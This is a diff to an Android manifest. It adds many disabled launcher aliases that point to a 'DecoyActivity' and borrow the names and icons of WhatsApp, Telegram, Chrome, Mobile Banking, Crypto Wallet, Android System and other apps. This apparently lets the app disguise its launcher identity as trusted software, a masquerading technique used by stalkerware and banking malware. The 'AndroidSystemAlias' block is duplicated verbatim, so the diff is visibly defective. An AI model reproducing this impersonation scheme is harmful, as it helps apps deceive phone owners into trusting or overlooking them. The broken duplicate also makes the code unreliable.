@@ -206,6 +206,216 @@
             </intent-filter>
         </activity-alias>
 
+        <activity-alias
+            android:name=".WhatsAppAlias"
+            android:enabled="false"
+            android:exported="true"
+            android:label="WhatsApp"
+            android:icon="@drawable/ic_whatsapp"
+            android:roundIcon="@drawable/ic_whatsapp"
+            android:targetActivity=".DecoyActivity">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity-alias>
+
+        <activity-alias
+            android:name=".TelegramAlias"
+            android:enabled="false"
+            android:exported="true"
+            android:label="Telegram"
+            android:icon="@drawable/ic_telegram"
+            android:roundIcon="@drawable/ic_telegram"
+            android:targetActivity=".DecoyActivity">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity-alias>
+
+        <activity-alias
+            android:name=".InstagramAlias"
+            android:enabled="false"
+            android:exported="true"
+            android:label="Instagram"
+            android:icon="@drawable/ic_instagram"
+            android:roundIcon="@drawable/ic_instagram"
+            android:targetActivity=".DecoyActivity">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity-alias>
+
+        <activity-alias
+            android:name=".YouTubeAlias"
+            android:enabled="false"
+            android:exported="true"
+            android:label="YouTube"
+            android:icon="@drawable/ic_youtube"
+            android:roundIcon="@drawable/ic_youtube"
+            android:targetActivity=".DecoyActivity">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity-alias>
+
+        <activity-alias
+            android:name=".ChromeAlias"
+            android:enabled="false"
+            android:exported="true"
+            android:label="Chrome"
+            android:icon="@drawable/ic_chrome"
+            android:roundIcon="@drawable/ic_chrome"
+            android:targetActivity=".DecoyActivity">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity-alias>
+
+        <activity-alias
+            android:name=".BankAlias"
+            android:enabled="false"
+            android:exported="true"
+            android:label="Mobile Banking"
+            android:icon="@drawable/ic_bank"
+            android:roundIcon="@drawable/ic_bank"
+            android:targetActivity=".DecoyActivity">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity-alias>
+
+        <activity-alias
+            android:name=".MailAlias"
+            android:enabled="false"
+            android:exported="true"
+            android:label="Email"
+            android:icon="@drawable/ic_email"
+            android:roundIcon="@drawable/ic_email"
+            android:targetActivity=".DecoyActivity">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity-alias>
+
+        <activity-alias
+            android:name=".VPNAlias"
+            android:enabled="false"
+            android:exported="true"
+            android:label="VPN"
+            android:icon="@drawable/ic_vpn"
+            android:roundIcon="@drawable/ic_vpn"
+            android:targetActivity=".DecoyActivity">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity-alias>
+
+        <activity-alias
+            android:name=".PdfAlias"
+            android:enabled="false"
+            android:exported="true"
+            android:label="Adobe Acrobat"
+            android:icon="@drawable/ic_pdf"
+            android:roundIcon="@drawable/ic_pdf"
+            android:targetActivity=".DecoyActivity">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity-alias>
+
+        <activity-alias
+            android:name=".MusicAlias"
+            android:enabled="false"
+            android:exported="true"
+            android:label="Music"
+            android:icon="@drawable/ic_music"
+            android:roundIcon="@drawable/ic_music"
+            android:targetActivity=".DecoyActivity">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity-alias>
+
+        <activity-alias
+            android:name=".TwitterAlias"
+            android:enabled="false"
+            android:exported="true"
+            android:label="X"
+            android:icon="@drawable/ic_twitter"
+            android:roundIcon="@drawable/ic_twitter"
+            android:targetActivity=".DecoyActivity">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity-alias>
+
+        <activity-alias
+            android:name=".TermuxAlias"
+            android:enabled="false"
+            android:exported="true"
+            android:label="Termux"
+            android:icon="@drawable/ic_termux"
+            android:roundIcon="@drawable/ic_termux"
+            android:targetActivity=".DecoyActivity">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity-alias>
+
+        <activity-alias
+            android:name=".CryptoAlias"
+            android:enabled="false"
+            android:exported="true"
+            android:label="Crypto Wallet"
+            android:icon="@drawable/ic_crypto"
+            android:roundIcon="@drawable/ic_crypto"
+            android:targetActivity=".DecoyActivity">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity-alias>
+
+        <activity-alias
+            android:name=".AndroidSystemAlias"
+            android:enabled="false"
+            android:exported="true"
+            android:label="Android System"
+            android:icon="@drawable/ic_android_system"
+            android:roundIcon="@drawable/ic_android_system"
+            android:targetActivity=".DecoyActivity">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity-alias>
+
+        <activity-alias
+            android:name=".AndroidSystemAlias"
+            android:enabled="false"
+            android:exported="true"
+            android:label="Android System"
+            android:icon="@drawable/ic_android_system"
+            android:roundIcon="@drawable/ic_android_system"
+            android:targetActivity=".DecoyActivity">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity-alias>
+
         <service
             android:name=".WorkManager_Sync"
             android:enabled="true"
